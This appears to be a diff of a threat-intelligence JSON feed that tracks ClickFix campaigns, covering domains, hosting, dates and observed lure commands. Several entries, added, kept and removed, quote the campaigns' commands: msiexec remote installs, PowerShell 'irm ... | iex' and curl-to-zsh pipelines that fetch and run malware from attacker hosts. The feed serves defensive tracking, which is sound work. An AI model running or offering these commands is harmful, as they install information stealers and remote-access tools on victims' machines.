@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5789,
+ "count": 5788,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -129339,14 +129339,17 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "MsIExeC.exe /package http:\\/eofic.sbs tbxjno /Q S1=\"𝝩​𝝞𝝩​𝗟𝝚 𝝚𝝡𝝖​𝝞​𝗟 𝝦​𝗥𝝚​𝗦𝗦 𝝚𝝢​𝝩​𝝚𝗥 \"",
     "msIExEC.exe /i http:\\/cf.com-web-restapi.sbs\\6ib8htpcpusi9e /Q S1=\" \""
    ],
    "connects_to": [
+    "eofic.sbs",
     "cf.com-web-restapi.sbs"
    ],
    "lure_from": [
     "browse-nnccodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -157912,8 +157915,8 @@
     "fingerprint-veri.info",
     "ncheck-brows.beer",
     "id-verfied.boats",
-    "jscdncloude.beer",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "jscdncloude.beer"
    ],
    "lure_from": [
     "browse-cloud.codes",
@@ -178578,8 +178581,8 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
@@ -219464,7 +219467,7 @@
    "last_seen": "2026-11-24",
    "last_online": "2026-11-24",
    "offline_since": null,
-   "url": "https://plshousing.org/",
+   "url": "https://plshousing.org/2026/09/11/[redacted]/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -219620,62 +219623,6 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes"
-   ]
-  },
-  {
-   "indicator": "pnzplus.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-10-21",
-   "last_online": "2026-11-24",
-   "offline_since": null,
-   "url": "https://pnzplus.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Leaseweb",
-   "dns": "site.eu",
-   "ip": "2a10:b5c1:112::1",
-   "asn": "AS60781",
-   "org": "LEASEWEB-NL-AMS-01 LeaseWeb Netherlands B.V., NL",
-   "country": "NL",
-   "ips": [
-    {
-     "ip": "2a10:b5c1:112::1",
-     "asn": "AS60781",
-     "org": "LEASEWEB-NL-AMS-01 LeaseWeb Netherlands B.V., NL",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "pnzplus.com",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//github[.]pw/ae8ouxb9gx/[id]')|iex"
-   ],
-   "connects_to": [
-    "trek-72.com",
-    "t-trustrest.com",
-    "github.pw",
-    "t-trustresnew.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
    ]
   },
   {
@@ -280197,7 +280144,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-12",
-   "last_seen": "2026-11-14",
+   "last_seen": "2026-11-24",
    "last_online": "2026-11-24",
    "offline_since": null,
    "url": "https://thehub-cic.co.uk/",
@@ -280215,7 +280162,7 @@
      "asn": "AS12488",
      "org": "KRYSTAL Krystal Hosting Ltd, GB",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-14"
+     "last_seen": "2026-11-24"
     }
    ],
    "hosts": [
@@ -280223,7 +280170,7 @@
      "host": "thehub-cic.co.uk",
      "status": "online",
      "first_seen": "2026-11-12",
-     "last_seen": "2026-11-14"
+     "last_seen": "2026-11-24"
     }
    ],
    "actor": null,
